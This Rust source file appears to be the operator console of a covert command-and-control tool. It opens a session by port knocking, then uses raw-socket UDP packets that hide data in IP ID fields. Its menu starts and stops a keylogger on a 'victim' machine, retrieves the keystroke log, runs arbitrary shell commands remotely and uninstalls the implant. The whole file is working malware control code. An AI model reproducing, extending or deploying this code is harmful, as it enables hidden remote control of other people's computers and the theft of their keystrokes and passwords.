use std::io::{self, Write};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::net::{IpAddr, Ipv4Addr};
use std::thread;
use std::time::Duration;
use pnet::transport::{transport_channel, TransportChannelType::Layer3};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::Packet;
use pnet::datalink;

mod port_knkr;
mod keylogger; // Ensure this exists or is accessible
mod covert;

use port_knkr::KnockSession;

// Command Codes
const CMD_START_LOGGER:     u8 = 0x10;
const CMD_STOP_LOGGER:      u8 = 0x20;
const CMD_UNINSTALL:        u8 = 0x30;
const CMD_REQUEST_KEYLOG:   u8 = 0x50;

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    running: Arc<AtomicBool>,
    tx_port: u16, // Where the victim is listening
    rx_port: u16, // Where we listen for replies
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            knock_session: None,
            running: Arc::new(AtomicBool::new(false)),
            tx_port: 0,
            rx_port: 0,
        }
    }

    fn send_covert_data(&self, payload: &[u8]) {
        let victim_ip = self.victim_ip.expect("No victim IP");
        let local_ip = self.local_ip.expect("No local IP");
        let mut state = covert::SenderState::new_from_bytes(payload);
        
        let protocol = Layer3(IpNextHeaderProtocols::Udp);
        let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        while state.has_next() && self.running.load(Ordering::SeqCst) {
            if let Some((ip_id, raw_word, masked_word)) = state.chunk_to_send() {
                let mut acked = false;
                let mut attempts = 0;

                while !acked && attempts < 5 {
                    attempts += 1;
                    let pkt = covert::build_udp_sender_packet(local_ip, victim_ip, self.rx_port, self.tx_port, ip_id, masked_word);
                    let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&pkt).unwrap(), IpAddr::V4(victim_ip));

                    let start = std::time::Instant::now();
                    while start.elapsed() < Duration::from_millis(800) {
                        if let Ok((packet, _)) = rx_iter.next() {
                            if let Some(recv_sig) = covert::parse_udp_ack_signature(packet.packet()) {
                                if recv_sig == covert::signature_ip_id(ip_id, raw_word) {
                                    state.ack();
                                    acked = true;
                                    break;
                                }
                            }
                        }
                    }
                }
                if !acked { 
                    println!("[!] Failed to send chunk after 5 attempts");
                    return; 
                }
            }
        }
    }

    fn spawn_listener(&self) {
        let running = self.running.clone();
        let target_ip = self.victim_ip.unwrap();
        let local_ip = self.local_ip.unwrap();
        let rx_port = self.rx_port;
        let tx_port = self.tx_port;

        thread::spawn(move || {
            let protocol = Layer3(IpNextHeaderProtocols::Udp);
            let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
            let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
            let mut receiver_state = covert::ReceiverState::new();

            while running.load(Ordering::SeqCst) {
                if let Ok((packet, _)) = rx_iter.next() {
                    if packet.get_source() == target_ip {
                        if let Some(parsed) = covert::parse_udp_data_from_ipv4(packet.packet()) {
                            if parsed.dst_port == rx_port {
                                let unmasked = covert::unmask_word(parsed.masked_word, parsed.ip_id);
                                if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
                                    
                                    // Send ACK back to victim
                                    let ack_params = covert::UdpAckParams {
                                        src_ip: local_ip,
                                        dst_ip: target_ip,
                                        src_port: rx_port,
                                        dst_port: tx_port,
                                        ip_id_signature: sig_id,
                                    };
                                    let ack_pkt = covert::build_udp_ack_packet(&ack_params);
                                    let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt).unwrap(), IpAddr::V4(target_ip));

                                    if receiver_state.complete {
                                        if let Ok(msg) = receiver_state.message_str() {
                                            println!("\n[Incoming] {}", msg);
                                        }
                                        receiver_state = covert::ReceiverState::new();
                                    }
                                }
                            }
                        }
                    }
                }
            }
        });
    }

    pub fn run(&mut self) {
        println!("=== Covert C2 Commander ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        println!("\n1) Initiate session (Port Knock)");
        println!("0) Exit");
        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => std::process::exit(0),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        println!("\n--- Connected to {:?} ---", self.victim_ip);
        println!("1) Start Keylogger");
        println!("2) Stop Keylogger");
        println!("3) Request Keylog File");
        println!("4) Run Shell Command");
        println!("5) Uninstall");
        println!("6) Disconnect");
        match prompt("Selection > ").as_str() {
            "1" => self.start_keylogger(),
            "2" => self.stop_keylogger(),
            "3" => self.request_keylog_file(),
            "4" => self.run_program(),
            "5" => self.uninstall(),
            "6" => self.disconnect(),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn initiate_connection(&mut self) {
        let target_ip_str = prompt("Target IP [127.0.0.1]: ");
        let ip = target_ip_str.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

        match port_knkr::port_knock(ip) {
            Ok(session) => {
                self.victim_ip = Some(ip);
                self.tx_port = session.tx_port; // Port on Victim
                self.rx_port = session.rx_port; // Port on Commander
                self.knock_session = Some(session);
                
                if let Some((_, local_v4)) = Self::find_interface_for_target(ip) {
                    self.local_ip = Some(local_v4);
                } else {
                    self.local_ip = Some(Ipv4Addr::new(127, 0, 0, 1));
                }

                self.running.store(true, Ordering::SeqCst);
                self.state = SessionState::Connected;
                self.spawn_listener(); 
                println!("[+] Knock Active. Ports -> Target Listener (TX): {}, Local Listener (RX): {}", self.tx_port, self.rx_port);
            }
            Err(e) => println!("[!] Knock failed: {}", e),
        }
    }

    fn find_interface_for_target(target: Ipv4Addr) -> Option<(String, Ipv4Addr)> {
        let interfaces = datalink::interfaces();
        for iface in &interfaces {
            for ip_net in &iface.ips {
                if let IpAddr::V4(local_v4) = ip_net.ip() {
                    // Check if target is in the same subnet or if it's loopback
                    if ip_net.contains(IpAddr::V4(target)) || local_v4.is_loopback() {
                        return Some((iface.name.clone(), local_v4));
                    }
                }
            }
        }
        None
    }

    fn start_keylogger(&mut self) { self.send_covert_data(&[CMD_START_LOGGER]); }
    fn stop_keylogger(&mut self) { self.send_covert_data(&[CMD_STOP_LOGGER]); }
    fn request_keylog_file(&mut self) { self.send_covert_data(&[CMD_REQUEST_KEYLOG]); }
    fn run_program(&mut self) {
        let cmd = prompt("Command: ");
        if !cmd.is_empty() {
            self.send_covert_data(cmd.as_bytes());
            println!("[*] Command sent. Listening for response...");
        }
    }

    fn uninstall(&mut self) {
        self.send_covert_data(&[CMD_UNINSTALL]);
        self.disconnect();
    }
    fn disconnect(&mut self) {
        self.running.store(false, Ordering::SeqCst);
        if let Some(ref session) = self.knock_session { session.stop(); }
        self.state = SessionState::Disconnected;
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    let mut commander = Commander::new();
    commander.run();
}
